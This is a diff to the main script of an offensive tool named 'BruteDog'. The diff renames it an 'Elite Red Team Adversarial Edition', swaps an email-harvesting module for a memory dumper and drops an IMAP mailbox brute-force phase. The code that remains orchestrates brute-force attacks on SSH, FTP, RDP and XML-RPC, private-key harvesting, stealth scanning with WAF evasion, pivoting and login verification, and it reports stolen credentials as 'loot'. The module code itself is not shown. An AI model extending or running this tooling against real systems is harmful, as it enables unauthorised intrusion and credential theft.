@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG V8.5 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (WAF Hardened Edition)
+BRUTEDOG V8.7 — LIVE SECURITY ASSESSMENT & STATE-MACHINE ORCHESTRATION ENGINE (Elite Red Team Adversarial Edition)
 Main Orchestrator:
 - Pre-flight DNS, target scope validation, and Poisson behavioral jitter initialization
 - Network reconnaissance & stealth port scanning with WAF-evading header rotation
@@ -29,7 +29,7 @@ from modules.replayer import replay_and_inject_payloads
 from modules.bruter import execute_active_assault_engine
 from modules.cloud_apex import run_cloud_apex
 from modules.pivot import run_pivot_engine
-from modules.dumper import harvest_email_intelligence
+from modules.dumper import execute_memory_dumper
 from modules.keyharvester import harvest_private_keys
 from modules.stealth_ops import run_stealth_engine
 from modules.live_login_verifier import execute_live_login_verification
@@ -61,7 +61,7 @@ BANNER = f"""{MATRIX_GREEN}{BOLD}
 ╚═╝╩╚═╚═╝ ╹ ╚═╝╩═╝╚═╝╚═╝
 {RESET}{NEON_BLUE}
 ════════════════════════════════════
-  BRUTEDOG V8.5 // COGNITIVE LOGIC ENGINE
+  BRUTEDOG V8.7 // COGNITIVE LOGIC ENGINE
   HTTP/2 SINGLE-PACKET / WAF EVASION
 ════════════════════════════════════
 {RESET}
@@ -195,7 +195,7 @@ async def async_main():
     started = time.monotonic()
     print("\033[2J\033[H")
     print(BANNER)
-    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.5 WAF Hardened).")
+    log("[SYSTEM] BruteDog Cognitive Orchestrator Initialized (v8.7 Elite Supremacy).")
 
     # --------------------------------------------------------
     # TARGET INPUT (Supports CLI argument or interactive prompt)
@@ -341,20 +341,15 @@ async def async_main():
         log(f"[EXPLOIT/CONCURRENCY ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE & MAILBOX EXPLOITATION
+    # PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE ASSAULT
     # --------------------------------------------------------
-    section("PHASE 4 — MULTI-PROTOCOL & MAILBOX EXPLOITATION")
+    section("PHASE 4 — MULTI-PROTOCOL BRUTE-FORCE ASSAULT")
     try:
         display_progress("Launching multi-protocol brute-force (SSH, FTP, RDP, XML-RPC).")
         apply_behavioral_jitter()
         brute_loot = await execute_active_assault_engine(target["url"])
         if brute_loot:
             alert_loot("Valid Service Credentials", brute_loot)
-
-        display_progress("Launching active IMAP mailbox brute-force and credential harvesting.")
-        email_loot = await harvest_email_intelligence(hostname)
-        if email_loot:
-            alert_loot("Mailbox Intelligence / Email Credentials", email_loot)
     except Exception as exc:
         log(f"[BRUTE ERROR] {exc}", RED)
 
